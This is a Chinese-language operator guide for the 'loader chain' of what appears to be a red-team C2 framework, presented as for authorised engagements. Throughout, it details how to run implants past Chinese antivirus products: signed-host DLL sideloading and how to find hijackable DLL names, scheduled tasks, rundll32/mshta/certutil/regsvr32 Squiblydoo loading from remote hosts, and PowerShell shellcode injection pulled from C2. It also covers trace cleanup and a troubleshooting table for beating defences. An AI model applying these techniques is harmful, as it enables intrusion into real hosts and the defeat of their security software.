# 加载器链（落地链）使用说明

> 本文档面向**已获授权的红队测试**：仅在你拥有书面授权的目标上使用。
> 生成逻辑在 `internal/server/api/oneliner.go`（`loaderChainVariants` / `LoaderAdvice`），
> 建议生成入口是「生成载荷」页返回的 `one_liners` 数组（每条变体带 `note` 字段）。

## 0. 为什么需要"加载器链"

实测环境事实（重要）：

- 在装有 **360 安全卫士 / 腾讯电脑管家 / 无边界安全系统** 等国产安全软件的主机上，
  **任何新生成或未签名的 PE 一执行就被拒绝并删除文件**；
- 连 Hello World 级别的 Go 程序也一样；微软签名的系统程序副本（如 `notepad.exe` 的副本）
  可以正常运行。

结论：**"直接下发一个未签名 exe 再执行"这条路在加固主机上基本无效**。要么先让载荷具备
有效签名，要么改成"不落地未签名 PE"或"由已签名宿主加载"的链路 —— 这就是加载器链。

> 本项目**不内置任何第三方加载器 / 宿主程序 / 二进制**。白加黑里的已签名宿主 exe 及其
> 加载的 DLL 名、Squiblydoo 用的 SCT 脚本，全部由操作员自备，并**自负合规责任**。
> 生成的命令只调用 Windows 自带程序（`rundll32` / `mshta` / `regsvr32` / `schtasks` /
> `certutil` / `powershell`），下载地址一律复用服务端已解析出的下载基址。

## 1. 什么时候用哪条

| 场景 | 首选链路 | 备选 |
| --- | --- | --- |
| 载荷**已签名**（受信任证书 + 时间戳） | 直接运行（`one_liners` 里的 PowerShell/BITS/certutil/curl 变体） | 计划任务 + 已签名宿主 |
| 载荷未签名，目标机有 360/电脑管家 | **白加黑（DLL 侧加载）** | 内存加载（shellcode 注入签名进程） |
| 需要执行时机与会话解耦 / 定时触发 | **计划任务 + 已签名宿主** | 白加黑 |
| 只要"能跑起来"，目标机防护较松 | LOLBin 直载（`rundll32` / `mshta` / `certutil`+宿主） | `regsvr32` Squiblydoo |
| 完全不允许落地任何 PE | **内存加载**（PowerShell `-enc` 注入 shellcode） | mshta 出网 + 签名宿主注入骨架 |
| Linux 目标 | `curl`/`wget` 直接下载执行，落地到 `$HOME/.cache` 规避 `/tmp noexec` | busybox / `python3 -c urllib` |
| macOS 目标 | 清 `com.apple.quarantine` 或 ad-hoc `codesign` 后运行 | 脚本类落地方式 |

服务端会在生成响应里同时给出这些变体的文本命令，每条 `note` 都写明前置条件与风险等级。
`LoaderAdvice(targetOS, format, signed)` 是给前端/调用方用的纯函数，可用来在页面上
直接展示"该走哪条链"的结论（调用点由集成方接线）。

## 2. 各链路的前置条件与国产杀软风险

风险等级含义：**低** = 通常能过；**中** = 取决于宿主机白名单信誉，需要试；
**高** = 国产杀软重点行为规则，大概率被拦，仅作短平快补充。

### 2.1 白加黑 · 签名宿主 DLL 侧加载（风险：中）

前置条件：

1. 把植入端按 **dll** 格式构建（命令里的 `<DLL载荷ID>` 换成实际 build id）；
2. **操作员自备**一个已签名的宿主 exe，以及它启动时会加载的 DLL 文件名。找法：
   - 用 Procmon 过滤 `Process Name` = 该宿主、`Path` ends with `.dll`、
     `Result` = `NAME NOT FOUND`；
   - 缺哪个同目录 DLL 时宿主仍能继续启动，那个 DLL 名就是可劫持点（侧加载点）；
   - 不要使用系统关键 DLL 名（可能破坏系统或被自保护拦截）。
3. 把植入端改名为那个 DLL 名，放到宿主同目录，然后运行签名宿主：

   ```cmd
   start "" "C:\Path\SignedHost.exe"
   ```

为什么有效：磁盘上不出现未签名的 **PE 可执行文件**，发起执行的进程是已签名程序。
为什么可能失败：360/电脑管家会校验"已签名进程加载无签名 DLL"，成功率取决于宿主与
DLL 名的白名单信誉；`certutil` 下载会在 Crypto 缓存留记录。

### 2.2 计划任务 + 已签名宿主（风险：高）

```cmd
schtasks /create /tn "<任务名>" /tr "rundll32.exe \"<DLL路径>\",<导出函数名>" /sc once /st 00:00 /f
schtasks /run /tn "<任务名>"
schtasks /delete /tn "<任务名>" /f
```

前置条件：dll 格式载荷 + 导出函数名；`/sc once /st 00:00` 只是计划时间，靠 `/run`
立即触发；执行后立刻 `/delete` 减少留痕。

风险：`schtasks` 创建"指向 `rundll32` + 用户可写目录 DLL"的任务是国产杀软重点规则，
**经常在建任务阶段就被拦截并回滚**；换成 `mshta`/`regsvr32` 作为宿主动作同样敏感。

### 2.3 LOLBin 直载（风险：高）

- `rundll32` 侧加载：`rundll32.exe "%TEMP%\<DLL文件名>.dll",<导出函数名>`
  —— "rundll32 加载 `%TEMP%` 下的 DLL"是最典型的高危组合，多数环境直接拦或事后清理。
- `mshta` 内联 JScript：`WinHttp` 下载 + `ADODB.Stream` 写盘 + `rundll32` 加载
  —— 很多加固基线用 AppLocker/WDAC 直接禁用 `mshta`。
- `certutil` 下载 + 宿主加载：`certutil` 是签名工具，但"下载 + `rundll32` 加载用户目录
  DLL"仍然敏感，且 `certutil` 会在 Crypto 缓存留记录（`certutil -urlcache * delete` 清理）。
- `regsvr32 /s /n /u /i:<sct地址> scrobj.dll`（Squiblydoo）：
  **注意**：当前下载接口返回的是 PE/hex 载荷，**不是 SCT 脚本**；本项目不内置也不托管
  SCT，请把自备的 SCT 放到下载基址下的静态路径（复用既有基址，不新增接口）。
  该手法在国内杀软下普遍被拦，`regsvr32` 出网拉脚本经常被直接结束进程。

### 2.4 内存加载 · 不落地 PE（风险：高）

- **首选**：`powershell -w hidden -nop -enc <Base64>`，脚本从 C2 拉取 shellcode 并注入
  当前 `powershell.exe`（微软签名进程）自身：

  ```powershell
  # 服务端生成的 -enc 串内部逻辑（示意）：
  # 1) 下载 shellcode：shellcode 格式的下载物是 hex 文本，按 hex 解码；shellcode_bin 是原始字节
  # 2) Add-Type 声明 VirtualAlloc / CreateThread / WaitForSingleObject
  # 3) VirtualAlloc(RWX 0x40) -> Marshal.Copy -> CreateThread -> WaitForSingleObject
  ```

- **备选（骨架）**：`mshta.exe` 出网把 hex 文本写到本地，再拉起已签名的 `powershell`
  执行注入 —— 价值在于把"出网进程"与"注入进程"拆开；落地物只有 hex 文本，不是 PE。

已知限制：

- `Add-Type` 会调用 .NET 编译器 `csc.exe` 并在 `%TEMP%` 生成编译中间文件；
  `ConstrainedLanguage` / AppLocker / WDAC 环境下会**直接失败**；
- "脚本宿主 + RWX 内存 + 远程线程"是国产杀软重点行为；
- 但相比下发未签名 exe，这条链路**不会被"一落地就删文件"**，是加固主机上最值得先试的
  无签名方案。

### 2.5 Linux / macOS

- Linux：不存在"国产杀软拦未签名 PE"的问题，主要看 EDR/HIDS 与加固基线。注意
  `/tmp` 被挂载为 `noexec` 时下载成功也执行不了（内置变体已含落地 `$HOME/.cache` 的版本）。
- macOS：Gatekeeper/quarantine 会挡未签名、未公证的二进制，需要
  `xattr -d com.apple.quarantine <文件>` 并 `chmod +x`，或 ad-hoc 签名
  （`codesign -s - <文件>`）。

## 3. 常见失败原因排查

| 现象 | 常见原因 | 处理 |
| --- | --- | --- |
| 命令执行后文件"消失" | 未签名 PE 被安全软件删除隔离 | 换白加黑 / 内存加载链；查安全软件隔离区日志 |
| 下载地址不可达 | 命令里的基址是控制台地址（`localhost`/内网） | 在"设置 → 监听器 → 公网地址(public_host)"填写目标机可达地址；响应里的 `one_liner_warning` 非空即为此情况 |
| `certutil` 报 `0x80070005`/校验失败 | 代理/网关拦截、URL 被改写、TLS 证书不被信任 | 换 `curl.exe`/BITS/HttpClient 变体；确认出口策略 |
| `rundll32` 无任何反应 | DLL 架构不匹配、导出函数名写错、DLL 被拦 | 核对 amd64/386 与导出函数名；改走白加黑让宿主加载 |
| `mshta` 直接报错退出 | AppLocker/WDAC/组策略禁用，或 ActiveX 被拦 | 换 PowerShell 变体；不要指望 `mshta` 在加固机上可用 |
| `regsvr32` 立即退出、无输出 | SCT 未托管或返回非 scriptlet 内容；出网被拦 | 确认 SCT 可经 HTTP 访问且 `Content-Type` 正常；该手法被拦则放弃 |
| `powershell -enc` 报脚本被阻止 | ConstrainedLanguage / 执行策略 / 脚本块日志 | 换 CMD 变体；或改用白加黑链 |
| 计划任务创建成功但没跑 | AV 回滚、任务被删除、`/tr` 路径含引号错误 | 检查 `schtasks /query /tn <任务名> /v`；减少引号嵌套 |
| 载荷上线后立刻掉线 | 载荷被行为拦截"半杀"（进程被挂起/网络被断） | 换注入目标进程与链路；检查是否存在 HIPS 主动防御弹窗 |
| 白加黑宿主启动异常/系统异常 | 劫持了系统关键 DLL 名 | 换宿主与 DLL 名，不要用系统关键组件 |

## 4. 合规与边界

- 本项目的加载器链**只生成文本命令与步骤**，不内置、不下载、不打包任何第三方宿主
  程序或加载器；
- 宿主 exe、DLL 名、SCT 脚本均由操作员自备，操作员对其来源合法性与使用合规性负全部责任；
- 仅限授权的红队/攻防演练场景使用；上线前请确认授权范围与目标清单。
